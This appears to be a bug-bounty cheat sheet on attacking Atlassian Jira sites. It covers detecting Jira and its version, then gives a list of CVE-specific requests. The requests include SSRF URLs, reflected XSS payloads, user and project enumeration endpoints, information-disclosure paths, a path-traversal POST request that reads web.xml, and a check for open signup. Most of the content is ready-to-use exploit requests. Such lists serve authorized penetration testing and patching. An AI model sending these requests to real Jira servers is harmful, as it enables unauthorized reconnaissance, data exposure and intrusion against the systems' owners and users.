# Jira Common Bugs

## Introduction
What would you do if you came across a website that uses Jira?

## How to Detect
Try to HTTP request to `https://example.com/secure/Dashboard.jspa` or `https://example.com/login.jsp` and there is a form login

1. Find the related CVE by checking jira version
* How to find the jira version

Try to request to `https://example.com/secure/Dashboard.jspa` and then check the source code. You will find this line `<meta name="ajs-version-number" content="8.20.9">` so 8.20.9 is the jira version. If you found outdated jira version, find the CVEs at [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-3578/product_id-8170/Atlassian-Jira.html)

Some example CVE:

- CVE-2017-9506 (SSRF)
```
https://example.com/plugins/servlet/oauth/users/icon-uri?consumerUri=<SSRF_PAYLOAD>
```
- CVE-2018-20824 (XSS)
```
https://example.com/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
```
- CVE-2019-8451 (SSRF)
```
https://example.com/plugins/servlet/gadgets/makeRequest?url=https://<HOST_NAME>:1337@example.com
```
- CVE-2019-8449 (User Information Disclosure)
```
https://example.com/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
```
- CVE-2019-8442 (Sensitive Information Disclosure)
```
https://example.com/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
```
- CVE-2019-3403 (User Enumeration)
```
https://example.com/rest/api/2/user/picker?query=<USERNAME_HERE>
```
- CVE-2020-14181 (User Enumeration)
```
https://example.com/secure/ViewUserHover.jspa?username=<USERNAME>
```
- CVE-2020-14178 (Project Key Enumeration)
```
https://example.com/browse.<PROJECT_KEY>
```
- CVE-2020-14179 (Information Disclosure)
```
https://example.com/secure/QueryComponent!Default.jspa
```
- CVE-2019-11581 (Template Injection)
```
example.com/secure/ContactAdministrators!default.jspa

* Try the SSTI Payloads
```

- CVE-2019-3396 (Path Traversal)
```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: {{Hostname}}
Accept: */*
Accept-Language: en-US,en;q=0.5 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Referer: {{Hostname}}
Content-Length: 168
Connection: close

{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}

*Try above request with the Jira target
```
- CVE-2019-3402 (XSS)
```
https://example.com/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
```

2. Signup enabled
```
POST /servicedesk/customer/user/signup HTTP/1.1
Host: example.com
Content-Type: application/json

{"email":"test@gmail.com","signUpContext":{},"secondaryEmail":"","usingNewUi":true}
```

## Reference
* [@harshbothra](https://twitter.com/harshbothra)